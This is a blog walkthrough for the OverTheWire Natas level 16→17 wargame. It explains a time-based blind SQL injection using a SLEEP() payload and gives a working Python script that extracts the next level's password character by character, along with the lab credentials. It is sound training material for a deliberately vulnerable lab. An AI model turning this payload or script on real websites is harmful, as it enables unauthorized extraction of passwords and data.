---
layout: post-with-comments
title: "OverTheWire Natas Level 16 → 17 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-16-to-17/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, sql-injection, blind-sqli, time-based]
description: "A step by step tutorial for OverTheWire Natas Level 16 → 17!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-15-to-16/' | relative_url }}">← Previous: Level 15 → 16</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas17.html" target="_blank" rel="noopener">
      Official (Level 17) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-17-to-18/' | relative_url }}">
      Next: Level 17 → 18 →
    </a>
  </div>
</nav>

## Login

URL: <http://natas17.natas.labs.overthewire.org>  
Credentials: **natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC**

```bash
# Using curl (optional):
curl -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC 
  http://natas17.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-16-to-17/homepage.jpg' | relative_url }})

---

## Task

This level is another **blind SQL injection**, but the page prints **no message at all**. So we can’t check content — we must use **timing** (response delay) to tell *true/false*.

---

## A little bit of Theory

Relevant logic (simplified):

```php
if (array_key_exists("username", $_REQUEST)) {
  $link = mysql_connect('localhost','natas17','<censored>');
  mysql_select_db('natas17', $link);

  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
  $res = mysql_query($query, $link);

  // No success/fail text is echoed
}
```

Because output is the same in both cases, we inject a condition that makes MySQL **sleep** when true:

```
natas18" AND password LIKE BINARY "<prefix>%" AND SLEEP(5)-- 
```

If `<prefix>` is correct so far ⇒ the query sleeps \~5s (slow response).
If not ⇒ returns immediately (fast).

---

## Solution

### Step 1: Craft the injection

We’ll probe with `LIKE BINARY "<prefix>%"` so the check is **case-sensitive**.

```
natas18" AND password LIKE BINARY "<prefix>%" AND SLEEP(5)-- 
```

### Step 2: Automate with Python (robust timing)

```python
import requests, time, sys
from string import ascii_lowercase, ascii_uppercase, digits

URL = "http://natas17.natas.labs.overthewire.org/"
AUTH = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
CHARSET = ascii_lowercase + ascii_uppercase + digits

SLEEP_SEC = 5          # what we ask MySQL to sleep
THRESHOLD = 2.5        # treat responses slower than this as TRUE
TIMEOUT = 8

s = requests.Session()
s.auth = AUTH

password = ""
while len(password) < 32:
    for ch in CHARSET:
        prefix = password + ch
        payload = {
            "username": f'natas18" AND password LIKE BINARY "{prefix}%" AND SLEEP({SLEEP_SEC})-- '
        }
        t0 = time.perf_counter()
        try:
            r = s.post(URL, data=payload, timeout=TIMEOUT)
        except requests.Timeout:
            # definite sleep ⇒ TRUE
            sys.stdout.write(ch); sys.stdout.flush()
            password += ch
            break
        dt = time.perf_counter() - t0

        if dt > THRESHOLD:
            sys.stdout.write(ch); sys.stdout.flush()
            password += ch
            break
print("\nRecovered password:", password)
```

Notes:

* If your network is noisy, **raise** `SLEEP_SEC` (5–7) and `TIMEOUT` (10–12).
* If you see false positives, bump `THRESHOLD` slightly (e.g., 3.0–3.5).
* `BINARY` keeps comparisons case-sensitive.

![run]({{ '/assets/images/natas/level-16-to-17/run.jpg' | relative_url }})

---

## Password

**Found on my run:**

```
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

Use this to log in to **natas18**.

---

### Troubleshooting

* **Always fast responses?** → Your injection may be malformed. Ensure quotes and `--` (with a trailing space) are present.
* **Random slow spikes?** → Increase `SLEEP_SEC` and `THRESHOLD`, or sample each char multiple times and take the majority.
* **Script halts mid-run?** → Just re-run; already discovered prefix is printed immediately, so it resumes fast.

---

**Boom 🎉** You just executed a **time-based blind SQL injection** and extracted the next password. On to **natas18**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

